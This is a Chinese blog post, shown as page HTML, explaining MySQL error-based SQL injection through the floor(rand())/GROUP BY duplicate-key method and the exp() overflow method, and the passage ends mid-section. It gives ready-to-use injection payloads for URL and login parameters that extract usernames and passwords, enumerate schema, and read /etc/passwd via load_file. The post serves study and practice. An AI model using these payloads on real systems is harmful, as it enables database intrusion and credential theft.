class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" itemprop="url">web知识总结</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>基本知识</span></a></span></div></div><h1 class="post-title" itemprop="name headline">再探SQL报错注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-12-14T12:37:44.065Z" title="发表于 2023-12-14 20:37:44">2023-12-14</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-02-03T01:42:57.115Z" title="更新于 2024-02-03 09:42:57">2024-02-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">6.7k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>28分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="再探SQL报错注入"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/"><header><a class="post-meta-categories" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" itemprop="url">web知识总结</a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url">基本知识</a><h1 id="CrawlerTitle" itemprop="name headline">再探SQL报错注入</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-12-14T12:37:44.065Z" title="发表于 2023-12-14 20:37:44">2023-12-14</time><time itemprop="dateCreated datePublished" datetime="2024-02-03T01:42:57.115Z" title="更新于 2024-02-03 09:42:57">2024-02-03</time></header><h1 id="0x01-前言">0x01 前言</h1>
<p>本文的产生是由于刚刚刷PentesterLab靶场遇到的SQL注入问题，发现自己对SQL报错注入还是有一定的欠缺，故此来复习一波。</p>
<h1 id="0x02-rand和order-by报错注入">0x02 rand和order by报错注入</h1>
<p>一般意义上来说，我们常用的显错注入手段是这两个，在mysql的官方文档中有这样一句</p>
<pre><code class="hljs plaintext">RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times.
译文：
每次执行 WHERE 时，都会重新计算 WHERE 子句中的 RAND()。不能在 ORDER BY 子句中使用带有 RAND() 值的列，因为 ORDER BY 会多次计算该列。</code></pre>
<p>也就是说不能作为order by的条件字段，group by同理，所以有如下payload：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">and</span><span class="hljs-operator">+</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-operator">+</span><span class="hljs-keyword">UNION</span><span class="hljs-operator">+</span><span class="hljs-keyword">SELECT</span><span class="hljs-operator">+</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-keyword">FROM</span><span class="hljs-operator">+</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">+</span><span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),(<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>concat(<span class="hljs-number">0x5f</span>,database(),<span class="hljs-number">0x5f</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x5f</span>,version())))a<span class="hljs-operator">+</span><span class="hljs-keyword">from</span><span class="hljs-operator">+</span>information_schema.tables<span class="hljs-operator">+</span><span class="hljs-keyword">group</span><span class="hljs-operator">+</span><span class="hljs-keyword">by</span><span class="hljs-operator">+</span>a)b<span class="hljs-comment">--</span></code></pre>
<p>其中a为:</p>
<pre><code class="hljs sql">concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),(<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>concat(<span class="hljs-number">0x5f</span>,database(),<span class="hljs-number">0x5f</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x5f</span>,version())))</code></pre>
<p>后面又group by a，所以会爆出</p>
<pre><code class="hljs plaintext">Duplicate entry ‘XXXXXXXXXX’ for key ‘group_key’
译文：
密钥“group_key”的条目“XXXXXXXXXX”重复</code></pre>
<p>其中XXXXX就是<code>0x5f,database(),0x5f,user(),0x5f,version()</code>的内容，这样一步步就能拿到想要的信息</p>
<p>在前面的payload中其实还有个很重要的函数是floor()取整，在之前的文章中研究过，floor(rand(0)*2)这样会产生重复的随机数，从而在order by时候报错。</p>
<p>接下来详细分析一波上述payload的原理：</p>
<h2 id="floor函数">Floor（）函数</h2>
<pre><code class="hljs plaintext">floor（），rand（），count（），group by联合使用：
floor（）：向下取整
rand（）：生成一个0-1之间的随机数，不包括0和1
count（*）：统计某个表下面一共有多少记录
group by XXX：按照一定的规则对XXX进行排序</code></pre>
<p>报错原理：group by和rand（）联合使用的时候，如果临时表中没有该主键，则再插入的之前会再计算一次rand（），然后再由group by将计算出来的主键直接插入到临时表格之中，导致主键重复，然后报错。<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231214210526397.png" alt="image-20231214210526397"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231214210545841.png" alt="image-20231214210545841"></p>
<p>上述是这些函数的简单用法，以下不想费劲搭环境了，直接照搬师傅的了。。。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231214210918104.png" alt="image-20231214210918104"></p>
<p>在这里使用group by的时候回生成一张临时表，也叫做虚拟表，而且表都是有主键的，作为主键的列是不能由重复的，好比第一个值的主键为1，那么就不能再有主键为1的值了，接下来可以再是2、3…</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215163639852.png" alt="image-20231215163639852"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215163654153.png" alt="image-20231215163654153"></p>
<p>可以看到上述两幅图片中第二幅图片的序列明显更规律（也就是伪序列）</p>
<p>首先这是一个虚拟表，自然就有主键。当使用group by去读这些数据的时候，好比上面这个伪随机序列，读完第一列，发现主键之中没有0这个数字，但由于rand的存在，他不会立刻插入，而是会继续运算一次rand函数，然后经过floor之后0变成了1，随后率先插入的数字便成了1。然后取第二条数据，此时floor之后为数字1，但该虚拟表中已经有了1，则该数字1对应的值自增1，继续从from的表中取第三条记录，再次计算floor(rand(0)*2)，结果为0，由于表中不存在数字0，则继续rand一次，经过floor之后成了1，但根据特性，该数字1会硬插入该虚拟表中，导致了数字1的重复，最终报错</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215163957161.png" alt="image-20231215163957161"></p>
<p>这里是个例子，将user（）的位置换做别的，就可以显示出别的错误了。<br>
爆库：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215164013653.png" alt="image-20231215164013653"></p>
<p>可以看到使用的security，后面的数字1是rand（）函数产生的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215164151961.png" alt="image-20231215164151961"></p>
<p>这里可以看到具体信息了。其实就是利用了count的统计与group by的合作，然后基于主键唯一的机制，然后造成了这个错误。</p>
<p>模板payload大致如下：</p>
<pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),(<span class="hljs-keyword">select</span> concat(<span class="hljs-number">0x5f</span>,database(),<span class="hljs-number">0x5f</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x5f</span>,version())))a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a)b;  #第一种

?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select concat(username,0x7e,password)from users limit 0,1))a from information_schema.tables group by a)b)--+  #第二种</span>
<span class="hljs-string"></span>
<span class="hljs-string">?id=1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()))a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a)b)<span class="hljs-comment">--+  #第二种</span>

?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select user()))x from information_schema.tables group by x)b)--+</span>
<span class="hljs-string"></span>
<span class="hljs-string">uname=hybcx&amp;passwd=1'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> concat(username,<span class="hljs-number">0x7e</span>,password)<span class="hljs-keyword">from</span> users),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x#<span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit   #第三种</code></pre>
<p>只需将上面模板中的内容替换成为我们的查询payload即可，a与b均是字段别名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215165205920.png" alt="image-20231215165205920"></p>
<h1 id="0x03-exp函数报错注入">0x03 EXP函数报错注入</h1>
<ul>
<li>作用：计算以e为底的幂值</li>
<li>语法：exp（X）</li>
<li>报错原理：当参数X超过了710之后，exp函数就会报错。</li>
</ul>
<p>MySQL中的EXP()函数用于将E提升为指定数字X的幂，这里E(2.718281 …)是自然对数的底数。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215165453272.png" alt="image-20231215165453272"></p>
<p>该函数可以用来进行 MySQL 报错注入。但是为什么会报错呢？我们知道，次方到后边每增加 1，其结果都将跨度极大，而 MySQL 能记录的 Double 数值范围有限，一旦结果超过范围，则该函数报错。这个范围的极限是 709，当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215165519117.png" alt="image-20231215165519117"></p>
<p>除了 exp() 之外，还有类似 pow() 之类的相似函数同样是可利用的，他们的原理相同。</p>
<ul>
<li>使用版本：MySQL5.5.5 及以上版本</li>
</ul>
<p>现在我们已经知道当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误。那么我们在实际利用中如何让 exp() 报错的同时返回我们想要得到的数据呢？</p>
<p>我们可以用 <code>~</code> 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231215165845068.png" alt="image-20231215165845068"></p>
<p>如上图所示，成功报错并输出了数据。但是事实证明，在 MySQL&gt;=5.5.53 之后，exp() 报错不能返回我们的查询结果，而只会得到一个报错：</p>
<p>下面由于实操的时候在安装MySQL低版本总是报错，我就直接照搬了（见谅~）</p>
<h2 id="注出数据">注出数据</h2>
<ul>
<li>得到表名：</li>
</ul>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database())x));
ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'exp(~((select '</span>flag,users<span class="hljs-string">' from dual)))'</span></code></pre>
<ul>
<li>得到列名：</li>
</ul>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">'users'</span>)x));
ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'exp(~((select '</span>id,username,password<span class="hljs-string">' from dual)))'</span></code></pre>
<ul>
<li>检索数据：</li>
</ul>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span> (<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(id, <span class="hljs-number">0x7c</span>, username, <span class="hljs-number">0x7c</span>, password) <span class="hljs-keyword">from</span> users)x));
ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'exp(~((select '</span><span class="hljs-number">1</span><span class="hljs-operator">|</span>admin<span class="hljs-operator">|</span><span class="hljs-number">123456</span>,<span class="hljs-number">2</span><span class="hljs-operator">|</span>whoami<span class="hljs-operator">|</span><span class="hljs-number">657260</span>,<span class="hljs-number">3</span><span class="hljs-operator">|</span>bunny<span class="hljs-operator">|</span><span class="hljs-number">864379</span><span class="hljs-string">' from dual)))'</span></code></pre>
<ul>
<li>读取文件（有13行的限制）：</li>
</ul>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> load_file(<span class="hljs-string">'/etc/passwd'</span>))x));
ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'exp(~((select '</span>root:x:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:root:<span class="hljs-operator">/</span>root:<span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>bash
daemon:x:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>:daemon:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
bin:x:<span class="hljs-number">2</span>:<span class="hljs-number">2</span>:bin:<span class="hljs-operator">/</span>bin:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
sys:x:<span class="hljs-number">3</span>:<span class="hljs-number">3</span>:sys:<span class="hljs-operator">/</span>dev:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
sync:x:<span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:sync:<span class="hljs-operator">/</span>bin:<span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>sync
games:x:<span class="hljs-number">5</span>:<span class="hljs-number">60</span>:games:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>games:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
man:x:<span class="hljs-number">6</span>:<span class="hljs-number">12</span>:man:<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>cache<span class="hljs-operator">/</span>man:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
lp:x:<span class="hljs-number">7</span>:<span class="hljs-number">7</span>:lp:<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>spool<span class="hljs-operator">/</span>lpd:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
mail:x:<span class="hljs-number">8</span>:<span class="hljs-number">8</span>:mail:<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>mail:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
news:x:<span class="hljs-number">9</span>:<span class="hljs-number">9</span>:news:<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>spool<span class="hljs-operator">/</span>news:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
uucp:x:<span class="hljs-number">10</span>:<span class="hljs-number">10</span>:uucp:<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>spool<span class="hljs-operator">/</span>uucp:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
proxy:x:<span class="hljs-number">13</span>:<span class="hljs-number">13</span>:proxy:<span class="hljs-operator">/</span>bin:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin
www<span class="hljs-operator">-</span>data:x:<span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www<span class="hljs-operator">-</span>data:<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>www:<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin<span class="hljs-string">' from dual)))'</span></code></pre>
<p>这个查询可以从当前的上下文中 dump 出所有的 tables 与 columns，我们也可以 dump 出所有的数据库，但由于我们是通过报错来获取，因此它返回的结果有限：</p>
<pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(concat(@:<span class="hljs-operator">=</span><span class="hljs-number">0</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)<span class="hljs-keyword">from</span>`information_schema`.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-keyword">and</span>@:<span class="hljs-operator">=</span>concat(@,<span class="hljs-number">0xa</span>,table_schema,<span class="hljs-number">0x3a3a</span>,table_name,<span class="hljs-number">0x3a3a</span>,column_name)),@)))x));
ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'exp(~((select '</span><span class="hljs-number">000</span>
ctf::flag::id
ctf::flag::flag
ctf::users::id
ctf::users::username
ctf::users::password<span class="hljs-string">' from dual)))'</span></code></pre>
<p>那对于这个payload我有所疑惑，因此我询问了GPT（其中的@符号的作用）</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(concat(@:<span class="hljs-operator">=</span><span class="hljs-number">0</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)<span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-keyword">and</span>@:<span class="hljs-operator">=</span>concat(@,<span class="hljs-number">0xa</span>,table_schema,<span class="hljs-number">0x3a3a</span>,table_name,<span class="hljs-number">0x3a3a</span>,column_name)),@)))x));</code></pre>
<p>在这个 SQL 查询语句中：</p>
<pre><code class="hljs sql">@:<span class="hljs-operator">=</span>concat(@,<span class="hljs-number">0xa</span>,table_schema,<span class="hljs-number">0x3a3a</span>,table_name,<span class="hljs-number">0x3a3a</span>,column_name)</code></pre>
<p><code>@</code> 是一个用户变量，用于存储中间结果。在这里，<code>@</code> 的作用是在不同的步骤中保留中间拼接的字符串。</p>
<p>让我解释一下：</p>
<ol>
<li><code>@:=0</code>：这是一个初始化步骤，将用户变量 <code>@</code> 设置为零。</li>
<li><code>@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)</code>：在这一步，<code>concat</code> 函数用于将当前的 <code>@</code> 值与新的字符串拼接，然后将结果再次存储在 <code>@</code> 变量中。这样，<code>@</code> 变量逐渐被构建起来，包含了多次拼接的结果。</li>
</ol>
<p>实际上，这两个 <code>@</code> 符号是同一个用户变量，只是在不同的时刻被使用。第一个 <code>@</code> 是在初始化时使用，而后续的 <code>@</code> 是在拼接字符串时使用，用于保留中间结果。</p>
<h2 id="insert位置注入">Insert位置注入</h2>
<p>根据 Insert 位置的注入方式按部就班就好了。假设原来的插入语句如下：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,password) <span class="hljs-keyword">values</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'john'</span>,<span class="hljs-string">'679237'</span>);</code></pre>
<p>我们可以在 username 或 password 位置插入恶意的 exp() 语句进行报错注入，如下所示：</p>
<pre><code class="hljs sql"># 在username处插入: 
john<span class="hljs-string">' or exp(~(select * from(select user())x)),1);#, </span>
<span class="hljs-string">则sql语句为: </span>
<span class="hljs-string">insert into users(id,username,password) values(4,'</span>john<span class="hljs-string">' or exp(~(select * from(select user())x)),1);#'</span>,<span class="hljs-string">'679237'</span>);

